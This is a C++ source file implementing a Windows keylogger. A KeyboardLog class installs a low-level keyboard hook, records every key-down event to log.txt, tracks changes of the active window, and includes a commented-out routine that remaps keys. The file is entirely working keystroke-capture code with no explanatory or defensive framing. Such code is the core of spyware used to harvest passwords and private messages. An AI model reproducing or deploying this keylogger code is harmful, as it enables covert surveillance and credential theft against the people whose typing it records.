#include "KeyboardLog.h"

WindowRecorder KeyboardLog::recorder;
bool KeyboardLog::logStarted;

//std::ofstream  KeyboardLog::out;

KeyboardLog::KeyboardLog()
{	
	//out.open("log.txt", std::ofstream::app);
	logStarted = false;
	recorder.start();
}


KeyboardLog::~KeyboardLog()
{
	//out.close();
	recorder.stop();	
}


LRESULT CALLBACK KeyboardLog::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL fEatKeystroke = FALSE;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;	

	/* Open file for writing */
	std::ofstream out;
	out.open("log.txt", std::ofstream::app);

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:			
			//std::cout << p->vkCode;

			/* If the user has changed the active window record it */
			if (recorder.windowChange()) 
			{	
				if (!logStarted) 
				{
					logStarted = true;
				}
				else
				{
					
				}
				
							
			}
			
			/* Record keyboard input */
			switch (p->vkCode) 
			{
			case 13:
				/* Handle Enter key */
				out << std::endl;
				break;
			case 222:
				/* Handle ' */
				out << "'";
				break;
			case 186:
				/* Handle ; */\
				out << ";";
				break;
			default:
				out << (char)p->vkCode; 
				break;
			}
						
			/*if (fEatKeystroke = (p->vkCode == 0x42)) {     //redirect a to b				
				keybd_event('X', 0, 0, 0);								
			}*/
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}
	
	out.close();
	return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}